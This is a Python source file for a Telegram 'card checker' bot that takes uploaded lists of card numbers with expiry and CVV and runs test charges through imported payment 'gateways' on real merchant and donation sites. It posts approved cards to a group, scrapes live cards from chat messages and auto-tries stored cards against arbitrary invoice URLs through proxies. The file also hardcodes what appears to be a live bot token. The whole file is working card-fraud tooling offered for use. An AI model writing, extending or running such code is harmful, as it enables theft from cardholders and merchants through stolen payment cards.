#!/usr/bin/env python3
"""
MADY - Complete Telegram Bot
Features: Card Checking, Auto-Checkout, Reply-to-Document Checking
Version: 2.0 - Production Ready
"""

import telebot
from telebot import types
import time
import os
import re
import json
import threading
import sys
from datetime import datetime
from checkout_integration import process_checkout, parse_card

# Add gateway directory to path
sys.path.insert(0, '100$/100$/')

# Import gateways
try:
    from Charge1 import BlemartCheckout
    GATEWAY_1 = True
except: GATEWAY_1 = False

try:
    from Charge2 import DistrictPeopleCheckout
    GATEWAY_2 = True
except: GATEWAY_2 = False

try:
    from Charge3 import SaintVinsonDonateCheckout
    GATEWAY_3 = True
except: GATEWAY_3 = False

try:
    from Charge4 import BGDCheckoutLogic
    GATEWAY_4 = True
except: GATEWAY_4 = False

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    GATEWAY_5 = True
except: GATEWAY_5 = False

# Bot Configuration
BOT_TOKEN = "7984658748:AAFLNS52swKHJkh4kWuu3LDgckslaZjyJTY"
GROUP_IDS = ["-1003546431412"]
BOT_CREDIT = "@MissNullMe"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Gateway configuration
GATEWAYS = {
    1: {"name": "Blemart", "func": BlemartCheckout if GATEWAY_1 else None, "amount": "$4.99", "available": GATEWAY_1},
    2: {"name": "District People", "func": DistrictPeopleCheckout if GATEWAY_2 else None, "amount": "€69.00", "available": GATEWAY_2},
    3: {"name": "Saint Vinson", "func": SaintVinsonDonateCheckout if GATEWAY_3 else None, "amount": "$20.00", "available": GATEWAY_3},
    4: {"name": "BGD Fresh", "func": BGDCheckoutLogic if GATEWAY_4 else None, "amount": "$6.50", "available": GATEWAY_4},
    5: {"name": "CC Foundation", "func": StaleksFloridaCheckoutVNew if GATEWAY_5 else None, "amount": "$1.00", "available": GATEWAY_5}
}

# Storage
approved_cards_storage = {}  # {group_id: [cards]}
user_sessions = {}  # {user_id: {"file": path, "gateway": num, "checking": bool}}
checkout_processes = {}  # {user_id: {"stop": bool, "thread": thread}}
storage_lock = threading.Lock()

# Helper functions
def add_approved_card(group_id: str, card: str):
    """Add approved card to storage"""
    with storage_lock:
        if group_id not in approved_cards_storage:
            approved_cards_storage[group_id] = []
        if len(approved_cards_storage[group_id]) >= 100:
            approved_cards_storage[group_id].pop(0)
        if card not in approved_cards_storage[group_id]:
            approved_cards_storage[group_id].append(card)

def get_approved_cards(group_id: str):
    """Get approved cards for group"""
    with storage_lock:
        return approved_cards_storage.get(group_id, []).copy()

def clear_approved_cards(group_id: str):
    """Clear approved cards"""
    with storage_lock:
        if group_id in approved_cards_storage:
            approved_cards_storage[group_id] = []

def parse_card_line(line: str):
    """Parse card from line"""
    line = line.strip()
    if '|' not in line:
        return None
    parts = line.split('|')
    if len(parts) != 4:
        return None
    return line

def check_single_card(card: str, gateway_num: int):
    """Check a single card with specified gateway"""
    gateway = GATEWAYS.get(gateway_num)
    if not gateway or not gateway["available"] or not gateway["func"]:
        return "error", "Gateway not available"
    
    try:
        result = gateway["func"](card)
        
        # Determine status
        result_lower = str(result).lower()
        if any(word in result_lower for word in ['charged', 'approved', 'success', 'thank you']):
            return "approved", result
        elif any(word in result_lower for word in ['declined', 'insufficient', 'expired', 'invalid']):
            return "declined", result
        else:
            return "error", result
    except Exception as e:
        return "error", str(e)

# Command: /start
@bot.message_handler(commands=['start'])
def start_command(message):
    """Welcome message"""
    welcome = f"""
🤖 <b>MADY BOT v2.0</b>

<b>📋 Card Checking:</b>
• Upload a text file with cards
• Reply to it with /check
• Select gateway and watch results

<b>🛒 Auto-Checkout:</b>
• /checkout [URL] - Auto-try stored cards
• /cards - View stored cards
• /clearcards - Clear storage

<b>ℹ️ Info:</b>
• /gateways - View available gateways
• /help - Show this message

<b>Bot by:</b> {BOT_CREDIT}
"""
    bot.send_message(message.chat.id, welcome, parse_mode='HTML')

# Command: /help
@bot.message_handler(commands=['help'])
def help_command(message):
    """Show help"""
    start_command(message)

# Command: /gateways
@bot.message_handler(commands=['gateways'])
def gateways_command(message):
    """Show available gateways"""
    gateway_list = []
    for num, gw in GATEWAYS.items():
        status = "✅" if gw["available"] else "❌"
        gateway_list.append(f"{status} Gateway {num}: {gw['name']} ({gw['amount']})")
    
    text = "<b>Available Gateways:</b>\n\n" + "\n".join(gateway_list)
    bot.reply_to(message, text, parse_mode='HTML')

# Command: /check (reply to document)
@bot.message_handler(commands=['check'])
def check_command(message):
    """Handle /check command - must reply to document"""
    user_id = message.from_user.id
    
    # Check if replying to a document
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, """
❌ <b>Invalid usage!</b>

<b>How to use:</b>
1. Upload a text file with cards
2. Reply to that file with /check
3. Select gateway from menu

<b>Card format:</b> NUMBER|MM|YY|CVV
<b>Example:</b> 4242424242424242|12|25|123
""", parse_mode='HTML')
        return
    
    # Check if already checking
    if user_id in user_sessions and user_sessions[user_id].get("checking"):
        bot.reply_to(message, "⚠️ You already have a check in progress. Use /stop to cancel it.")
        return
    
    # Download file
    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save temporarily
        file_path = f"temp_{user_id}_{int(time.time())}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        # Read and validate cards
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        cards = []
        for line in lines:
            card = parse_card_line(line)
            if card:
                cards.append(card)
        
        if not cards:
            os.remove(file_path)
            bot.reply_to(message, "❌ No valid cards found in file. Format: NUMBER|MM|YY|CVV")
            return
        
        # Store session
        user_sessions[user_id] = {
            "file": file_path,
            "cards": cards,
            "checking": False
        }
        
        # Show gateway selection
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = []
        for num, gw in GATEWAYS.items():
            if gw["available"]:
                buttons.append(types.InlineKeyboardButton(
                    f"Gateway {num}: {gw['name']} ({gw['amount']})",
                    callback_data=f"gateway_{num}_{user_id}"
                ))
        markup.add(*buttons)
        
        bot.reply_to(message, f"""
✅ <b>File loaded successfully!</b>

<b>Total cards:</b> {len(cards)}
<b>Select gateway to start checking:</b>
""", reply_markup=markup, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error loading file: {str(e)[:100]}")

# Gateway selection callback
@bot.callback_query_handler(func=lambda call: call.data.startswith('gateway_'))
def gateway_callback(call):
    """Handle gateway selection"""
    try:
        parts = call.data.split('_')
        gateway_num = int(parts[1])
        user_id = int(parts[2])
        
        # Verify user
        if call.from_user.id != user_id:
            bot.answer_callback_query(call.id, "❌ This is not your session")
            return
        
        # Check session
        if user_id not in user_sessions:
            bot.answer_callback_query(call.id, "❌ Session expired")
            return
        
        session = user_sessions[user_id]
        if session.get("checking"):
            bot.answer_callback_query(call.id, "⚠️ Already checking")
            return
        
        # Start checking
        session["checking"] = True
        session["gateway"] = gateway_num
        session["stop"] = False
        
        bot.answer_callback_query(call.id, f"✅ Starting with Gateway {gateway_num}")
        
        # Edit message
        bot.edit_message_text(
            f"🔄 <b>Checking started with Gateway {gateway_num}</b>\n\nProcessing {len(session['cards'])} cards...",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML'
        )
        
        # Start checking thread
        thread = threading.Thread(
            target=process_checking,
            args=(user_id, call.message.chat.id, call.message.message_id),
            daemon=True
        )
        thread.start()
        
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)[:50]}")

def process_checking(user_id, chat_id, message_id):
    """Process card checking"""
    try:
        session = user_sessions[user_id]
        cards = session["cards"]
        gateway_num = session["gateway"]
        gateway = GATEWAYS[gateway_num]
        
        approved = 0
        declined = 0
        errors = 0
        
        for i, card in enumerate(cards, 1):
            # Check stop flag
            if session.get("stop"):
                break
            
            # Check card
            status, result = check_single_card(card, gateway_num)
            
            if status == "approved":
                approved += 1
                # Store card
                add_approved_card(str(chat_id), card)
                
                # Post to groups
                success_msg = f"""
✅ <b>APPROVED</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway['name']} ({gateway['amount']})
<b>Response:</b> {str(result)[:100]}

<b>Bot by:</b> {BOT_CREDIT}
"""
                for gid in GROUP_IDS:
                    try:
                        bot.send_message(gid, success_msg, parse_mode='HTML')
                    except:
                        pass
            
            elif status == "declined":
                declined += 1
            else:
                errors += 1
            
            # Update progress every 10 cards
            if i % 10 == 0 or i == len(cards):
                try:
                    progress_text = f"""
🔄 <b>Progress: {i}/{len(cards)}</b>

✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

<b>Gateway:</b> {gateway['name']}
"""
                    bot.edit_message_text(
                        progress_text,
                        chat_id=chat_id,
                        message_id=message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            time.sleep(0.5)  # Small delay
        
        # Final result
        final_text = f"""
✅ <b>CHECKING COMPLETE</b>

<b>Total Processed:</b> {i}/{len(cards)}
✅ <b>Approved:</b> {approved} ({approved/len(cards)*100:.1f}%)
❌ <b>Declined:</b> {declined} ({declined/len(cards)*100:.1f}%)
⚠️ <b>Errors:</b> {errors}

<b>Gateway:</b> {gateway['name']} ({gateway['amount']})
<b>Bot by:</b> {BOT_CREDIT}
"""
        bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        try:
            bot.edit_message_text(
                f"❌ Error during checking: {str(e)[:200]}",
                chat_id=chat_id,
                message_id=message_id
            )
        except:
            pass
    
    finally:
        # Cleanup
        if user_id in user_sessions:
            session = user_sessions[user_id]
            if "file" in session and os.path.exists(session["file"]):
                try:
                    os.remove(session["file"])
                except:
                    pass
            session["checking"] = False

# Command: /stop
@bot.message_handler(commands=['stop'])
def stop_command(message):
    """Stop current checking"""
    user_id = message.from_user.id
    
    if user_id in user_sessions and user_sessions[user_id].get("checking"):
        user_sessions[user_id]["stop"] = True
        bot.reply_to(message, "🛑 Stopping check...")
    else:
        bot.reply_to(message, "⚠️ No active check found.")

# Command: /checkout
@bot.message_handler(commands=['checkout'])
def checkout_command(message):
    """Auto-checkout with stored cards"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    group_id = str(chat_id)
    
    # Check if already running
    if user_id in checkout_processes and checkout_processes[user_id].get("thread") and checkout_processes[user_id]["thread"].is_alive():
        bot.reply_to(message, "⚠️ Checkout already running. Use /stopcheckout first.")
        return
    
    # Parse command
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, """
❌ <b>Invalid usage!</b>

<b>Usage:</b>
<code>/checkout [invoice_url]</code>
<code>/checkout [invoice_url] proxy:port:user:pass</code>

<b>Example:</b>
<code>/checkout https://example.com/invoice/abc123</code>
""", parse_mode='HTML')
        return
    
    invoice_url = parts[1]
    proxy = parts[2] if len(parts) > 2 else None
    
    # Validate URL
    if not invoice_url.startswith('http'):
        bot.reply_to(message, "❌ Invalid URL")
        return
    
    # Get cards
    cards = get_approved_cards(group_id)
    if not cards:
        bot.reply_to(message, """
❌ <b>No approved cards!</b>

Run /check first to get approved cards.
""", parse_mode='HTML')
        return
    
    # Start checkout
    initial_msg = bot.reply_to(message, f"""
🚀 <b>AUTO-CHECKOUT STARTED</b>

<b>Invoice:</b> <code>{invoice_url[:50]}...</code>
<b>Cards:</b> {len(cards)}
<b>Proxy:</b> {'Yes' if proxy else 'No'}

<i>Trying cards...</i>
""", parse_mode='HTML')
    
    checkout_processes[user_id] = {"stop": False, "thread": None}
    
    def run_checkout():
        try:
            def progress_callback(card, status, message_text, current, total):
                if checkout_processes.get(user_id, {}).get("stop"):
                    return
                
                if current % 5 == 0 or status == "live":
                    try:
                        bot.edit_message_text(
                            f"""
🔄 <b>Progress: {current}/{total}</b>

<b>Card:</b> <code>{card[:4]}****{card[-4:]}</code>
<b>Status:</b> {status.upper()}
<b>Message:</b> {message_text[:50]}
""",
                            chat_id=chat_id,
                            message_id=initial_msg.message_id,
                            parse_mode='HTML'
                        )
                    except:
                        pass
                
                if status == "live":
                    success_msg = f"""
✅ <b>CHECKOUT SUCCESS!</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Invoice:</b> <code>{invoice_url[:50]}...</code>

<b>Bot by:</b> {BOT_CREDIT}
"""
                    for gid in GROUP_IDS:
                        try:
                            bot.send_message(gid, success_msg, parse_mode='HTML')
                        except:
                            pass
            
            def stop_check():
                return checkout_processes.get(user_id, {}).get("stop", False)
            
            result = process_checkout(invoice_url, cards, proxy=proxy, callback=progress_callback, stop_check=stop_check)
            
            if result["success"]:
                final_text = f"""
🎉 <b>CHECKOUT COMPLETE - SUCCESS!</b>

<b>Card:</b> <code>{result['successful_card']}</code>
<b>Tried:</b> {result['total_tried']}/{len(cards)}

<b>Bot by:</b> {BOT_CREDIT}
"""
            else:
                final_text = f"""
❌ <b>CHECKOUT FAILED</b>

<b>Tried:</b> {result['total_tried']}/{len(cards)}
<b>Reason:</b> All cards failed or invoice expired
"""
            
            try:
                bot.edit_message_text(final_text, chat_id=chat_id, message_id=initial_msg.message_id, parse_mode='HTML')
            except:
                bot.send_message(chat_id, final_text, parse_mode='HTML')
        
        except Exception as e:
            try:
                bot.edit_message_text(f"❌ Error: {str(e)[:200]}", chat_id=chat_id, message_id=initial_msg.message_id)
            except:
                pass
        
        finally:
            if user_id in checkout_processes:
                del checkout_processes[user_id]
    
    thread = threading.Thread(target=run_checkout, daemon=True)
    checkout_processes[user_id]["thread"] = thread
    thread.start()

# Command: /stopcheckout
@bot.message_handler(commands=['stopcheckout'])
def stop_checkout_command(message):
    """Stop checkout"""
    user_id = message.from_user.id
    if user_id in checkout_processes:
        checkout_processes[user_id]["stop"] = True
        bot.reply_to(message, "🛑 Stopping checkout...")
    else:
        bot.reply_to(message, "⚠️ No active checkout.")

# Command: /cards
@bot.message_handler(commands=['cards'])
def cards_command(message):
    """Show stored cards"""
    group_id = str(message.chat.id)
    cards = get_approved_cards(group_id)
    
    if not cards:
        bot.reply_to(message, "📭 No stored cards.")
        return
    
    recent = cards[-10:]
    cards_text = "\n".join([f"• <code>{c}</code>" for c in recent])
    
    bot.reply_to(message, f"""
💳 <b>Stored Cards</b>

<b>Total:</b> {len(cards)}
<b>Showing:</b> Last {len(recent)}

{cards_text}
""", parse_mode='HTML')

# Command: /clearcards
@bot.message_handler(commands=['clearcards'])
def clear_cards_command(message):
    """Clear stored cards"""
    group_id = str(message.chat.id)
    count = len(get_approved_cards(group_id))
    clear_approved_cards(group_id)
    bot.reply_to(message, f"🧹 Cleared {count} cards.")

# Capture approved cards from messages
@bot.message_handler(func=lambda m: True, content_types=['text'])
def capture_cards(message):
    """Auto-capture approved cards"""
    group_id = str(message.chat.id)
    text = message.text
    
    if any(word in text.lower() for word in ['approved', 'live', 'charged', '✅']):
        pattern = r'(\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})'
        matches = re.findall(pattern, text)
        for card in matches:
            if parse_card(card):
                add_approved_card(group_id, card)

# Start bot
if __name__ == "__main__":
    print("="*60)
    print("MADY BOT v2.0 - COMPLETE")
    print("="*60)
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Groups: {', '.join(GROUP_IDS)}")
    print(f"Credit: {BOT_CREDIT}")
    print("\nAvailable Gateways:")
    for num, gw in GATEWAYS.items():
        status = "✅" if gw["available"] else "❌"
        print(f"  {status} Gateway {num}: {gw['name']} ({gw['amount']})")
    print("\nCommands:")
    print("  /check - Reply to document to check cards")
    print("  /checkout <url> - Auto-try stored cards")
    print("  /cards - View stored cards")
    print("  /gateways - View available gateways")
    print("="*60)
    print("\nBot is running...")
    
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
